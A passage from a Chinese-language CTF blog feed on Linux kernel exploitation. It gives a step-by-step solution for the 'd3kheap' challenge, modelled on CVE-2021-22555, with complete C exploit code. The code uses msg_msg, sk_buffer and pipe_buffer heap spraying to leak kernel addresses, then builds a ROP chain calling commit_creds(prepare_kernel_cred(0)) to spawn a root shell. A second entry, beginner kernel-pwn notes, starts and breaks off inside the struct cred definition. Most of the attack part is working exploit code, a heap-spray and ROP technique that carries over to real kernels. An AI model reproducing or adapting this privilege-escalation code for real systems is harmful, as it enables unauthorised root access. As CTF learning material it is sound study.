class="number">-0x30</span>,i);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span>* ppbuf_op = msgbuf; </span><br><span class="line">    ppbuf_op[<span class="number">2</span>] = gadget; <span class="comment">// op-&gt;release</span></span><br><span class="line">    ppbuf_op[<span class="number">1</span>] = gadget; <span class="comment">// op-&gt;release</span></span><br><span class="line">    ppbuf_op[<span class="number">3</span>] = gadget; <span class="comment">// op-&gt;release</span></span><br><span class="line">    ppbuf_op[<span class="number">0</span>] = gadget; <span class="comment">// op-&gt;release</span></span><br><span class="line">    <span class="comment">// memset(msgbuf, '\x44', 0X1000);</span></span><br><span class="line"></span><br><span class="line">    LOG(<span class="string">"spray msg_msg to write fake pipe_buffer_operation in kmalloc-256"</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>;i&lt;<span class="number">50</span>;++i)</span><br><span class="line">    {</span><br><span class="line">        write_msg(msgqid[<span class="number">3</span>],msgbuf,<span class="number">256</span><span class="number">-0x30</span>,i);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span>* ropchain = buf;</span><br><span class="line">    ropchain[<span class="number">2</span>] = kernel_heap_addr<span class="number">-0xC0</span>+<span class="number">256</span>+<span class="number">0x30</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*]fake_pipe_buffer_operation addr:0x%llx\n"</span>,ropchain[<span class="number">2</span>]);</span><br><span class="line">    <span class="type">int</span> j = <span class="number">4</span>;</span><br><span class="line">    ropchain[j++] = pop_rdi;</span><br><span class="line">    ropchain[j++] = <span class="number">0</span>;</span><br><span class="line">    ropchain[j++] = prepare_kernel_cred;</span><br><span class="line">    ropchain[j++] = mov_rdi_rax_rep;</span><br><span class="line">    ropchain[j++] = commit_creds_ptr;</span><br><span class="line">    ropchain[j++] = swapgs_restore_regs_and_return_to_usermode+<span class="number">22</span>;</span><br><span class="line">    ropchain[j++] = <span class="number">0</span>;</span><br><span class="line">    ropchain[j++] = <span class="number">0</span>;</span><br><span class="line">    ropchain[j++] = get_root_shell;</span><br><span class="line">    ropchain[j++] = <span class="number">0x33</span>;</span><br><span class="line">    ropchain[j++] = <span class="number">0x246</span>;</span><br><span class="line">    ropchain[j++] = <span class="built_in">stack</span>+<span class="number">0x2000</span>;</span><br><span class="line">    ropchain[j++] = <span class="number">0x2b</span>;</span><br><span class="line"></span><br><span class="line">    LOG(<span class="string">"spray sk_buffer to write fake_pipe_buffer"</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i&lt;<span class="number">32</span>;++i)</span><br><span class="line">    {</span><br><span class="line">        ret = socketpair(AF_UNIX,SOCK_STREAM,<span class="number">0</span>,sk_sockets[i]);</span><br><span class="line">        <span class="keyword">if</span>(ret&lt;<span class="number">0</span>)</span><br><span class="line">            err_exit(<span class="string">"socketpair"</span>);</span><br><span class="line">        ret = write(sk_sockets[i][<span class="number">0</span>],ropchain,<span class="number">1024</span><span class="number">-320</span>);</span><br><span class="line">        <span class="keyword">if</span>(ret&lt;<span class="number">0</span>)</span><br><span class="line">            err_exit(<span class="string">"write_sk_socket"</span>);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    LOG(<span class="string">"free pipe_buffer to trigger exploit"</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i&lt;<span class="number">20</span>;++i)</span><br><span class="line">    {</span><br><span class="line">        ret = close(pipe_fds2[i][<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">if</span>(ret&lt;<span class="number">0</span>)</span><br><span class="line">            err_exit(<span class="string">"pipe_release"</span>);</span><br><span class="line">        ret = close(pipe_fds2[i][<span class="number">1</span>]);</span><br><span class="line">        <span class="keyword">if</span>(ret&lt;<span class="number">0</span>)</span><br><span class="line">            err_exit(<span class="string">"pipe_release"</span>);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202401181651638.png"></p><h2 id="解法二-CVE-2021-22555"><a href="#解法二-CVE-2021-22555" class="headerlink" title="解法二 CVE-2021-22555"></a>解法二 CVE-2021-22555</h2><h3 id="步骤-1"><a href="#步骤-1" class="headerlink" title="步骤"></a>步骤</h3><p>Google在CVE-2021-22555中提供了稳定的UAF解法.</p><p>大致思路与解法一差不多.<br>(df-object即能够double free的那个object)</p><ol><li>释放df-object,喷射msg_msg</li><li>释放df-object,喷射sk_buffer伪造m_ts字段,越界读出下一个msg_msg的指针(指向msg_queue).</li><li>释放并再喷射sk_buffer,伪造m_ts字段和next指针指向msg_queue,用fake_msg读出下一个msg_msg地址,fake_msg(df-object)地址位于下一个msg_msg-0x400处.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202401191847662.png"></li></ol><p>顺便提一下,为什么不用后记里的方法泄露msg_queue的地址呢?因为分配后分配的msg_msg会破坏掉之前sk_buffer的tail,可能导致panic.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202401191848368.png"></p><ol start="4"><li>释放sk_buffer并再次拿回,修复fake_msg的list_head.</li><li>释放sk_buffer并再次拿回,释放fake_msg后喷射pipe_buffer.</li><li>用sk_buffer读出内核基址并释放.</li><li>再次喷射sk_buffer,伪造pipe_buffer以及fake_operation,布置ropchain,劫持控制流完成提权.</li></ol><h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h3><p>这一版基本能做到稳定提权.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;kernelpwn.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">int</span> ret;</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>,_IONBF,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">    save_status();</span><br><span class="line">    bind_core(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    dev_fd = open(<span class="string">"/dev/d3kheap"</span>,O_RDWR);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> msgqid[<span class="number">32</span>];</span><br><span class="line">    <span class="type">size_t</span> buf[<span class="number">0x400</span>];</span><br><span class="line">    <span class="built_in">memset</span>(buf,<span class="string">'A'</span>,<span class="number">0x2000</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i&lt;<span class="number">16</span>;++i)</span><br><span class="line">    {</span><br><span class="line">        msgqid[i] = get_msg_queue();</span><br><span class="line">        write_msg(msgqid[i],buf,<span class="number">1024</span><span class="number">-0x30</span>,<span class="number">1</span>);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    ioctl(dev_fd,<span class="number">0x1234</span>);</span><br><span class="line">    ioctl(dev_fd,<span class="number">0xDEAD</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">16</span>;i&lt;<span class="number">32</span>;++i)</span><br><span class="line">    {</span><br><span class="line">        msgqid[i] = get_msg_queue();</span><br><span class="line">        write_msg(msgqid[i],buf,<span class="number">1024</span><span class="number">-0x30</span>,<span class="number">1</span>);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    LOG(<span class="string">"spray sk_buffer and write fake msg_msg to OOB leak msg_queue addr"</span>);</span><br><span class="line">    <span class="type">int</span> sk_socket[<span class="number">64</span>][<span class="number">2</span>];</span><br><span class="line">    <span class="built_in">memset</span>(buf,<span class="string">'B'</span>,<span class="number">0x2000</span>);</span><br><span class="line">    ioctl(dev_fd,<span class="number">0xDEAD</span>);</span><br><span class="line">    build_msg(buf,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="number">1</span>,<span class="number">0x1000</span><span class="number">-0x30</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i&lt;<span class="number">32</span>;++i)</span><br><span class="line">    {</span><br><span class="line">        socketpair(AF_UNIX,SOCK_STREAM,<span class="number">0</span>,sk_socket[i]);</span><br><span class="line">        ret = write(sk_socket[i][<span class="number">0</span>],buf,<span class="number">1024</span><span class="number">-320</span>);</span><br><span class="line">        <span class="keyword">if</span>(ret&lt;<span class="number">0</span>)</span><br><span class="line">            err_exit(<span class="string">"write fake msg_msg"</span>);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    ret = peek_msg(msgqid[<span class="number">16</span>],buf,<span class="number">0x1000</span><span class="number">-0x30</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(ret&lt;<span class="number">0</span>)</span><br><span class="line">        err_exit(<span class="string">"peek_msg"</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// for(size_t* p = buf;p-buf&lt;(0x1000-0x30)/8;++p)</span></span><br><span class="line">    <span class="comment">// {</span></span><br><span class="line">    <span class="comment">//     printf("[ ]data dump: 0x%llx\n",*p);</span></span><br><span class="line">    <span class="comment">// }</span></span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> msg_queue_addr = <span class="number">0</span>;</span><br><span class="line">    <span class="type">size_t</span>* pval = (<span class="type">char</span>*)buf+<span class="number">8</span>+<span class="number">1024</span><span class="number">-0x30</span>;</span><br><span class="line">    <span class="comment">// printf("[ ]data dump: 0x%llx\n",*pval);</span></span><br><span class="line">    <span class="keyword">if</span>((*pval&amp; <span class="number">0xffff000000000000</span>) == <span class="number">0xffff000000000000</span>&amp;&amp;!msg_queue_addr&amp;&amp;pval[<span class="number">3</span>]==<span class="number">1024</span><span class="number">-0x30</span>)</span><br><span class="line">        msg_queue_addr = *pval;</span><br><span class="line">    <span class="keyword">if</span>(!msg_queue_addr)</span><br><span class="line">        fail_exit(<span class="string">"Fail to leak msg_queue addr"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*]msg_queue addr: 0x%llx\n"</span>,msg_queue_addr);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i&lt;<span class="number">32</span>;++i)</span><br><span class="line">    {</span><br><span class="line">        read(sk_socket[i][<span class="number">1</span>],buf,<span class="number">1024</span><span class="number">-320</span>);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    LOG(<span class="string">"spray sk_buffer and write fake msg_msg to read df-object addr"</span>);</span><br><span class="line">    build_msg(buf,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="number">1</span>,<span class="number">0x2000</span><span class="number">-0x30</span>,msg_queue_addr<span class="number">-8</span>,<span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i&lt;<span class="number">32</span>;++i)</span><br><span class="line">    {</span><br><span class="line">        socketpair(AF_UNIX,SOCK_STREAM,<span class="number">0</span>,sk_socket[i]);</span><br><span class="line">        ret = write(sk_socket[i][<span class="number">0</span>],buf,<span class="number">1024</span><span class="number">-320</span>);</span><br><span class="line">        <span class="keyword">if</span>(ret&lt;<span class="number">0</span>)</span><br><span class="line">            err_exit(<span class="string">"write fake msg_msg"</span>);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    ret = peek_msg(msgqid[<span class="number">16</span>],buf,<span class="number">0x2000</span><span class="number">-0x30</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(ret&lt;<span class="number">0</span>)</span><br><span class="line">        err_exit(<span class="string">"peek_msg"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// for(size_t* p = buf+((0x1000-0x30)/8+1);p-buf&lt;(0x2000-0x30)/8;++p)</span></span><br><span class="line">    <span class="comment">// {</span></span><br><span class="line">        <span class="comment">// printf("[ ]data dump: 0x%llx\n",*p);</span></span><br><span class="line">    <span class="comment">// }</span></span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> df_object_addr = *(buf+((<span class="number">0x1000</span><span class="number">-0x30</span>)/<span class="number">8</span>+<span class="number">1</span>)) - <span class="number">0x400</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*]Got df-object addr : 0x%llx\n"</span>,df_object_addr);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i&lt;<span class="number">32</span>;++i)</span><br><span class="line">    {</span><br><span class="line">        read(sk_socket[i][<span class="number">1</span>],buf,<span class="number">1024</span><span class="number">-320</span>);</span><br><span class="line">    }</span><br><span class="line">    LOG(<span class="string">"spray sk_buffer to fix msg_msg"</span>);</span><br><span class="line">    build_msg(buf,msg_queue_addr,msg_queue_addr,<span class="number">1</span>,<span class="number">1024</span><span class="number">-0x30</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i&lt;<span class="number">32</span>;++i)</span><br><span class="line">    {</span><br><span class="line">        socketpair(AF_UNIX,SOCK_STREAM,<span class="number">0</span>,sk_socket[i]);</span><br><span class="line">        ret = write(sk_socket[i][<span class="number">0</span>],buf,<span class="number">1024</span><span class="number">-320</span>);</span><br><span class="line">        <span class="keyword">if</span>(ret&lt;<span class="number">0</span>)</span><br><span class="line">            err_exit(<span class="string">"write fake msg_msg"</span>);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    LOG2(<span class="string">"Free msg_msg"</span>);</span><br><span class="line">    <span class="comment">//这里全部释放会卡住.</span></span><br><span class="line">    <span class="comment">// for(int i = 0;i&lt;32;++i)</span></span><br><span class="line">    <span class="comment">// {</span></span><br><span class="line">    ret = read_msg(msgqid[<span class="number">16</span>],buf,<span class="number">1024</span><span class="number">-0x30</span>,<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(ret&lt;<span class="number">0</span>)</span><br><span class="line">        err_exit(<span class="string">"read_msg"</span>);</span><br><span class="line">    <span class="comment">// }</span></span><br><span class="line"></span><br><span class="line">    LOG2(<span class="string">"spray pipe_buffer"</span>);</span><br><span class="line">    <span class="type">int</span> pipe_fd[<span class="number">32</span>][<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i&lt;<span class="number">32</span>;++i)</span><br><span class="line">    {</span><br><span class="line">        ret = pipe(pipe_fd[i]);</span><br><span class="line">        <span class="keyword">if</span>(ret&lt;<span class="number">0</span>)</span><br><span class="line">            err_exit(<span class="string">"pipe"</span>);</span><br><span class="line">        ret =  write(pipe_fd[i][<span class="number">1</span>],<span class="string">"BBBBBBBB"</span>,<span class="number">8</span>);</span><br><span class="line">        <span class="keyword">if</span>(ret&lt;<span class="number">0</span>)</span><br><span class="line">            err_exit(<span class="string">"pipe_write"</span>);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    kernel_base = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i&lt;<span class="number">32</span>;++i)</span><br><span class="line">    {</span><br><span class="line">        read(sk_socket[i][<span class="number">1</span>],buf,<span class="number">1024</span><span class="number">-320</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">size_t</span>* p = buf;p-buf&lt;(<span class="number">1024</span><span class="number">-320</span>)/<span class="number">8</span>;++p)</span><br><span class="line">        {</span><br><span class="line">            <span class="comment">// printf("[ ]data dump: 0x%llx\n",*p);</span></span><br><span class="line">            <span class="keyword">if</span>((*p &amp; <span class="number">0xffffffff00000000</span>) == <span class="number">0xffffffff00000000</span> &amp;&amp;!kernel_base &amp;&amp; (*p&amp;<span class="number">0xFFFFF</span>)==<span class="number">0x3fe40</span>)</span><br><span class="line">            {</span><br><span class="line">                kernel_base = *p<span class="number">-0x103fe40</span>;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"[*]Kernel base:0x%llx\n"</span>,kernel_base);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            }</span><br><span class="line">            <span class="keyword">if</span>(kernel_base)</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!kernel_base)</span><br><span class="line">        fail_exit(<span class="string">"Fail to leak kernel_base"</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    LOG(<span class="string">"spray sk_buffer to write fake_pipe_buffer,fake_operation,ropchain"</span>);</span><br><span class="line">    <span class="type">size_t</span> gadget = kernel_base+<span class="number">0x2dbede</span>;</span><br><span class="line">    <span class="type">size_t</span> pop_rdi = kernel_base+<span class="number">0x938f0</span>;</span><br><span class="line">    <span class="type">size_t</span> mov_rdi_rax_rep = kernel_base+<span class="number">0xbe98cb</span>;</span><br><span class="line">    <span class="type">size_t</span> commit_creds_ptr = kernel_base+<span class="number">0x000d25c0</span>;</span><br><span class="line">    <span class="type">size_t</span> prepare_kernel_cred = kernel_base+<span class="number">0x000d2ac0</span>;</span><br><span class="line">    <span class="type">size_t</span> swapgs_restore_regs_and_return_to_usermode = kernel_base+<span class="number">0x00c00ff0</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="type">char</span>* <span class="built_in">stack</span> = mmap(<span class="number">0x504000</span>,<span class="number">0x4000</span>,<span class="number">7</span>,MAP_ANONYMOUS|MAP_PRIVATE,<span class="number">-1</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">memset</span>(<span class="built_in">stack</span>,<span class="string">'4'</span>,<span class="number">0x4000</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> fake_operation_addr = <span class="number">16</span>*<span class="number">8</span>+df_object_addr;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*]fake_operation_addr: 0x%llx\n"</span>,fake_operation_addr);</span><br><span class="line">    <span class="comment">//fake_pipe_buffer-&gt;ops</span></span><br><span class="line">    buf[<span class="number">2</span>] = fake_operation_addr;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//ropchain</span></span><br><span class="line">    buf[<span class="number">4</span>] = pop_rdi;</span><br><span class="line">    buf[<span class="number">5</span>] = <span class="number">0</span>;</span><br><span class="line">    buf[<span class="number">6</span>] = prepare_kernel_cred;</span><br><span class="line">    buf[<span class="number">7</span>] = mov_rdi_rax_rep;</span><br><span class="line">    buf[<span class="number">8</span>] = commit_creds_ptr;</span><br><span class="line">    buf[<span class="number">9</span>] = swapgs_restore_regs_and_return_to_usermode+<span class="number">22</span>;</span><br><span class="line">    buf[<span class="number">10</span>] = <span class="number">0</span>;</span><br><span class="line">    buf[<span class="number">11</span>] = <span class="number">0</span>;</span><br><span class="line">    buf[<span class="number">12</span>] = get_root_shell;</span><br><span class="line">    buf[<span class="number">13</span>] = <span class="number">0x33</span>;</span><br><span class="line">    buf[<span class="number">14</span>] = <span class="number">0x246</span>;</span><br><span class="line">    buf[<span class="number">15</span>] = <span class="built_in">stack</span>+<span class="number">0x2000</span>;</span><br><span class="line">    buf[<span class="number">16</span>] = <span class="number">0x2b</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//fake_operation</span></span><br><span class="line">    buf[<span class="number">17</span>] = gadget;</span><br><span class="line"></span><br><span class="line">    key_alloc(<span class="string">"asd"</span>,buf,<span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i&lt;<span class="number">64</span>;++i)</span><br><span class="line">    {</span><br><span class="line">        socketpair(AF_UNIX,SOCK_STREAM,<span class="number">0</span>,sk_socket[i]);</span><br><span class="line">        ret = write(sk_socket[i][<span class="number">0</span>],buf,<span class="number">1024</span><span class="number">-320</span>);</span><br><span class="line">        <span class="keyword">if</span>(ret&lt;<span class="number">0</span>)</span><br><span class="line">            err_exit(<span class="string">"write fake msg_msg"</span>);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    LOG(<span class="string">"free pipe_buffer to trigger exploit"</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i&lt;<span class="number">32</span>;++i)</span><br><span class="line">    {</span><br><span class="line">        ret = close(pipe_fd[i][<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">if</span>(ret&lt;<span class="number">0</span>)</span><br><span class="line">            err_exit(<span class="string">"pipe_release"</span>);</span><br><span class="line">        ret = close(pipe_fd[i][<span class="number">1</span>]);</span><br><span class="line">        <span class="keyword">if</span>(ret&lt;<span class="number">0</span>)</span><br><span class="line">            err_exit(<span class="string">"pipe_release"</span>);</span><br><span class="line">    }</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202401191833369.png"></p>]]></content>
      
      
      <categories>
          
          <category> Pwn </category>
          
          <category> Kernel </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
            <tag> Kernel </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux Kernel Exploit 入门笔记</title>
      <link href="/2024/Linux%20Kernel%20Exploit%20Basic--Notes/"/>
      <url>/2024/Linux%20Kernel%20Exploit%20Basic--Notes/</url>
      
        <content type="html"><![CDATA[<p>笔者kernel pwn入门时的笔记,由于笔者接触kernel时间较短,难免出现错误….</p><span id="more"></span><h2 id="Aim"><a href="#Aim" class="headerlink" title="Aim"></a>Aim</h2><p>int commit_creds(struct cred *new) 更改进程的cred.</p><p>commit_creds(prepare_kernel_cred(NULL));完成权限提升</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> {</span></span><br><span class="line"><span class="type">atomic_t</span>usage;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></span><br><span class="line"><span class="type">atomic_t</span>subscribers;<span class="comment">/* number of processes subscribed */</span></span><br><span class="line"><span class="type">void</span>*put_addr;</span><br><span class="line"><span class="type">unsigned</span>magic;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CRED_MAGIC0x43736564</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CRED_MAGIC_DEAD0x44656144</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="type">kuid_t</span>uid;<span class="comment">/* real UID of the task */</span></span><br><span class="line"><span class="type">kgid_t</span>gid;<span class="comment">/* real GID of the task */</span></span><br><span class="line"><span class="type">kuid_t</span>suid;<span class="comment">/* saved UID of the task */</span></span><br><span class="line"><span class="type">kgid_t</span>sgid;<span class="comment">/* saved GID of the task */</span></span><br><span class="line"><span class="type">kuid_t</span>euid;<span class="comment">/* effective UID of the task */</span></span><br><span class="line"><span class="type">kgid_t</span>egid;<span class="comment">/* effective GID of the task */</span></span><br><span class="line"><span class="type">kuid_t</span>fsuid;<span class="comment">/* UID for VFS ops */</span></span><br><span class="line"><span class="type">kgid_t</span>fsgid;<span class="comment">/* GID for VFS ops */</span></span><br><span class="line"><span class="type">unsigned</span>securebits;<span class="comment">/* SUID-less security management */</span></span><br><span class="line"><span class="type">kernel_cap_t</span>cap_inheritable; <span class="comment">/* caps our children can inherit */</span></span><br><span class="line"><span class="type">kernel_cap_t</span>cap_permitted;<span class="comment">/* caps we're permitted */</span></span><br><span class="line"><span class="type">kernel_cap_t</span>cap_effective;<span class="comment">/* caps we can actually use */</span></span><br><span class="line"><span class="type">kernel_cap_t</span>cap_bset;<span class="comment">/* capability bounding set */</span></span><br><span class="line"><span class="type">kernel_cap_t</span>cap_ambient;<span class="comment">/* Ambient 